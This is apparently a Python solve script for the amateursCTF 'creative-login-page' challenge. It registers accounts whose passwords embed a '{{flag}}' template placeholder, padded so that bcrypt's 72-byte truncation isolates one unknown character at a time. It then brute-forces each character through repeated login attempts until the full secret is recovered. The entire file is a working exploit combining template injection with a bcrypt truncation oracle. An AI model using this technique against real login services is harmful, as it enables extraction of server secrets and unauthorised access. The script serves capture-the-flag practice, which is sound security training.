from string import printable
from time import sleep
from uuid import uuid4
from requests import post

BCRYPT_MAX_LENGTH = 72

if __name__ == "__main__":
    flag = "amateursCTF{"
    while not flag.endswith("}"):
        username = str(uuid4())
        with post(
            "http://creative-login-page.amt.rs/register",
            params={
                "username": username,
                "password": f"{'0' * (BCRYPT_MAX_LENGTH - 1 - len(flag))}{{{{flag}}}}",
            },
        ) as req:
            if not "Hello" in req.text:
                raise RuntimeError(req.text)
        found = False
        for char in printable:
            with post(
                "http://creative-login-page.amt.rs/login",
                params={
                    "username": username,
                    "password": f"{'0' * (BCRYPT_MAX_LENGTH - 1 - len(flag))}{flag}{char}",
                },
            ) as req:
                if "Hello" in req.text:
                    found = True
                    flag += char
                    print(flag)
                    break
        if not found:
            raise RuntimeError(flag)
